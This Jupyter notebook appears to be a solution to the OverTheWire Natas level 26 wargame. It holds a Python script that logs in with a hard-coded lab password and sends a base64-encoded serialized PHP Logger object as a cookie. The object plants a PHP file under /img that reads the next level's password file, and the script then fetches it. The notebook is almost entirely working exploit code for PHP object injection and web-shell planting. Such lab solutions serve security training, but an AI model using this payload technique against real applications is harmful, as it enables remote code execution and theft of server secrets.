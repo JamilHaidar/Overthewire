{
 "cells": [
  {
   "cell_type": "code",
   "execution_count": 1,
   "metadata": {},
   "outputs": [],
   "source": [
    "import requests\n",
    "from requests.auth import HTTPBasicAuth\n",
    "session = requests.Session()\n",
    "session.auth = ('natas26','cVXXwxMS3Y26n5UZU89QgpGmWCelaQlE')\n",
    "url = 'http://natas26.natas.labs.overthewire.org'\n",
    "r = session.get(url)\n",
    "# Create cookie with serialized injected Logger\n",
    "#\n",
    "# class Logger{\n",
    "#         private $logFile;\n",
    "#         private $initMsg;\n",
    "#         private $exitMsg;\n",
    "\n",
    "#         function __construct($file){\n",
    "#             // initialise variables\n",
    "#             $this->initMsg=\"#--session started--#\\n\";\n",
    "#             $this->exitMsg=\"<?php readfile('/etc/natas_webpass/natas26'); ?>\";\n",
    "#             $this->logFile = \"/img/test.php\";\n",
    "\n",
    "#         }\n",
    "\n",
    "#         function log($msg){\n",
    "#             $fd=fopen($this->logFile,\"a+\");\n",
    "#             fwrite($fd,$msg.\"\\n\");\n",
    "#             fclose($fd);\n",
    "#         }\n",
    "\n",
    "#         function __destruct(){\n",
    "#             // write exit message\n",
    "#             // $fd=fopen($this->logFile,\"a+\");\n",
    "#             // fwrite($fd,$this->exitMsg);\n",
    "#             // fclose($fd);\n",
    "#         }\n",
    "#     };\n",
    "cookie = {'PHPSESSID': r.cookies['PHPSESSID'],'drawing':'Tzo2OiJMb2dnZXIiOjM6e3M6MTU6IgBMb2dnZXIAbG9nRmlsZSI7czoxMzoiL2ltZy90ZXN0LnBocCI7czoxNToiAExvZ2dlcgBpbml0TXNnIjtzOjIyOiIjLS1zZXNzaW9uIHN0YXJ0ZWQtLSMKIjtzOjE1OiIATG9nZ2VyAGV4aXRNc2ciO3M6NDg6Ijw/cGhwIHJlYWRmaWxlKCcvZXRjL25hdGFzX3dlYnBhc3MvbmF0YXMyNicpOyA/PiI7fQ=='}\n",
    "r = session.post(url,cookies=cookie)\n",
    "r = session.get(url+'/img/test.php')"
   ]
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 3",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.9.13"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 2
}
